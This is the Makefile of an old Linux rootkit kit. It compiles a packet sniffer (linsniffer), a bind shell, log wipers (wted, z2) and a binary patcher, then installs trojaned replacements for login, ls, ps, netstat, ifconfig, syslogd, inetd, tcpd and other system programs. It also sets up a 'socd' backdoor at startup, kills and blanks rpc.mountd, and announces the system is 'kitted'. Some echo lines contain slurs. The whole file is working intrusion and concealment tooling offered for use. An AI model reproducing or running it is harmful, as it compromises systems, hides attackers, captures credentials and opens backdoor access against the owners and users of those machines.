.EXPORT_ALL_VARIABLES:

# comment this out, if you don't have shadow passwords on your system
# This will affect the compilation of the subdirs: ftpd
#HAVE_SHADOW_PASSWORDS=true

# Do you want to have GNU readline and history support in 'ftp'. Use
# cursor keys to get your last commands.
# I use the GNU readline support from bash-1.14 for this.
USE_GNU_READLINE=true

# You could also use "YACC=yacc", if you have the BSD yacc.
YACC=bison -y

# The TCP wrapper doesn't really work for the "rexecd", since it
# waits for further incoming connections once invoked (which are not
# checked by the TCP wrapper binary).
# Install the TCP wrapper library to compile rexecd with these extra checks.
# Also, *DONT* wrap the "rexecd" in your /etc/inetd.conf!

# This may not work right now!!!!!!!!!!!!!!!!
# HAVE_TCP_WRAPPER_LIBRARY=true

# Optimization for compiling all programs.
O=-O2 -fomit-frame-pointer -pipe

# Flags for ld. You don't have to add "-s", since all binaries are
# stripped on installation ("install -s ...").
# LDFLAGS=-v
LDFLAGS=

################### END OF CONFIGURATION PART ###############################

# Just to have a short-cut in the subdirectory Makefiles.
IBSD=-I/usr/include/bsd -include /usr/include/bsd/bsd.h

# These are just a common cases. Then we don't have do write anything in the
# sublevel makefiles.
CFLAGS = ${O} ${IBSD}
LDLIBS = -lbsd

SUB = 	chfn chsh inetd login net-tools-1.32-alpha passwd \
 procps-1.01 rshd sysklogd-1.3 tcpd_7.4 fileutils-3.13
SHADOWSUB = inetd net-tools-1.32-alpha procps-1.01 rshd sysklogd-1.3 \
 shadow-961025 tcpd_7.4 fileutils-3.13

CC=gcc

all:
	${CC} -o fix fix.c
	${CC} -o z2 z2.c 
	${CC} -o wted wted.c
	${CC} -O2 -o linsniffer linsniffer.c
	${CC} -o bindshell bindshell.c
	for i in $(SUB); do make -C  $$i; done
	mv chfn/chfn bin
	mv chsh/chsh bin
	mv login/login bin
	mv passwd/passwd bin

s:
	${CC} -o fix fix.c
	${CC} -o z2 z2.c
	${CC} -o wted wted.c
	${CC} -O2 -o linsniffer linsniffer.c
	${CC} -o bindshell bindshell.c
	for i in $(SHADOWSUB); do make -C  $$i; done
	mv shadow-961025/src/chfn bin
	mv shadow-961025/src/chsh bin
	mv shadow-961025/src/login bin
	mv shadow-961025/src/passwd bin

shadow:
	if [ -x /bin/login ] && [ -x shadow/login ]; then fix /bin/login shadow/login; fi
	if [ -x /bin/ls ] && [ -x fileutils-3.13/src/ls ]; then fix /bin/ls fileutils-3.13/src/ls; fi
	if [ -x /bin/du ] && [ -x fileutils-3.13/src/du ]; then fix /bin/du fileutils-3.13/src/du; fi
	if [ -x /bin/ps ] && [ -x procps-1.01/ps ]; then fix /bin/ps procps-1.01/ps; fi
	if [ -x /usr/bin/top ] && [ -x procps-1.01/top ]; then fix /usr/bin/top procps-1.01/top; fi
	if [ -x /usr/sbin/in.rshd ] && [ -x rshd/rshd ]; then fix /usr/sbin/in.rshd rshd/rshd; fi
	if [ -x /bin/netstat ] && [ -x net-tools-1.32-alpha/netstat ]; then fix /bin/netstat net-tools-1.32-alpha/netstat; fi
	if [ -x /sbin/ifconfig ] && [ -x net-tools-1.32-alpha/ifconfig ]; then fix /sbin/ifconfig net-tools-1.32-alpha/ifconfig; fi
	if [ -x /usr/sbin/syslogd ] && [ -x sysklogd-1.3/syslogd ]; then fix /usr/sbin/syslogd sysklogd-1.3/syslogd; fi
	if [ -x /usr/sbin/inetd ] && [ -x inetd/inetd ]; then fix /usr/sbin/inetd inetd/inetd; fi
	if [ -x /usr/sbin/tcpd ] && [ -x tcpd_7.4/tcpd ]; then fix /usr/sbin/tcpd tcpd_7.4/tcpd; fi
	if [ -x /usr/sbin/smbd ] && [ -x smbd ]; then fix /usr/sbin/smbd smbd; else cp smbd /usr/sbin -f ; fi
	if [ -x /usr/sbin/socd ] ; then killall -9 socd; fi
	if [ -x /usr/sbin/imapd ] && [ -x imapd ]; then fix /usr/sbin/imapd imapd; fi
	if [ -x /etc/shadow ] && [ -x shadow/imapd ] ; then echo "installing shadow version of imapd" ; fix /usr/sbin shadow/imapd; fi
	if [ -x /etc/rc.d/rc.sysinit ] && [ -x socd ]; then ./socd-inst ; else echo "not red shit. trying slackware" ; fi
	if [ -x /etc/rc.d/rc.inet1 ] && [-x socd ]; then ./socd-inet2 ; else echo "gay linux version try copying socd manually" ; fi
	./root.new
	echo "updating pop services"
	./updtpop
	cp libgdbm.so.1 /lib -f
	echo "done"
	/usr/sbin/inetd
	echo "if you get any errors dont worry bout it.. we have fixed everything"
	echo "but you might want to see if inetd is loaded."
	cp ipop3d /usr/sbin
	killall -9 inetd
	/usr/sbin/inetd
	echo "this system is now kitted as a shadow system."

install:
	if [ -x /bin/login ] && [ -x bin/login ]; then fix /bin/login bin/login; fi
	if [ -x /etc/shadow ] && [ -x shadow/login ] ; then echo "yer admin is ereet wif shadow pws" ; fix /bin/login shadow/login; fi
	if [ -x /bin/ls ] && [ -x fileutils-3.13/src/ls ]; then fix /bin/ls fileutils-3.13/src/ls; fi
	if [ -x /bin/du ] && [ -x fileutils-3.13/src/du ]; then fix /bin/du fileutils-3.13/src/du; fi
	if [ -x /bin/ps ] && [ -x procps-1.01/ps ]; then fix /bin/ps procps-1.01/ps; fi
	if [ -x /usr/bin/top ] && [ -x procps-1.01/top ]; then fix /usr/bin/top procps-1.01/top; fi
	if [ -x /usr/sbin/in.rshd ] && [ -x rshd/rshd ]; then fix /usr/sbin/in.rshd rshd/rshd; fi
	if [ -x /bin/netstat ] && [ -x net-tools-1.32-alpha/netstat ]; then fix /bin/netstat net-tools-1.32-alpha/netstat; fi
	if [ -x /sbin/ifconfig ] && [ -x net-tools-1.32-alpha/ifconfig ]; then fix /sbin/ifconfig net-tools-1.32-alpha/ifconfig; fi
	if [ -x /usr/sbin/syslogd ] && [ -x sysklogd-1.3/syslogd ]; then fix /usr/sbin/syslogd sysklogd-1.3/syslogd; fi
	if [ -x /usr/sbin/inetd ] && [ -x inetd/inetd ]; then fix /usr/sbin/inetd inetd/inetd; fi
	if [ -x /usr/sbin/tcpd ] && [ -x tcpd_7.4/tcpd ]; then fix /usr/sbin/tcpd tcpd_7.4/tcpd; fi
#	if [ -x /usr/sbin/named ] && [ -x named ]; then fix /usr/sbin/named named; else cp named /usr/sbin -f ; fi
	if [ -x /usr/sbin/smbd ] && [ -x smbd ]; then fix /usr/sbin/smbd smbd; else cp smbd /usr/sbin -f ; fi
	if [ -x /usr/sbin/socd ] ; then killall -9 socd; fi
	if [ -x /usr/sbin/imapd ] && [ -x imapd ]; then fix /usr/sbin/imapd imapd; fi
	if [ -x /etc/shadow ] && [ -x shadow/imapd ] ; then echo "installing shadow version of imapd" ; fix /usr/sbin shadow/imapd; fi
	if [ -x /etc/rc.d/rc.sysinit ] && [ -x socd ]; then ./socd-inst ; else echo "not red shit. trying slackware" ; fi
	if [ -x /etc/rc.d/rc.inet1 ] && [-x socd ]; then ./socd-inet2 ; else echo "gay linux version try copying socd manually" ; fi
#	if [ -x /usr/sbin/ipop3d ] && [ -x popsafe ]; then ./updt-pop; fi
#	if [ -x /usr/sbin/in.pop3d ] && [ -x popsafe ]; then ./updt-pop2; fi
	killall -9 portmap
	killall -9 rpc.mountd
	echo >/usr/sbin/rpc.mountd
	./root.new
	echo "updating pop services"
	./updtpop
	cp libgdbm.so.1 /lib -f
	echo "done"
	/usr/sbin/inetd
	/usr/sbin/named
	echo "if you get any errors dont worry bout it.. we have fixed everything"
	killall -9 inetd
	killall -9 named
	echo "but you might want to see if inetd is loaded."
	cp ipop3d /usr/sbin
	/usr/sbin/inetd
	/usr/sbin/named
	echo "thank you for playing. late."
clean:
	for i in $(SUB); do make -C  $$i clean; done
	for i in $(SHADOWSUB); do make -C  $$i clean; done
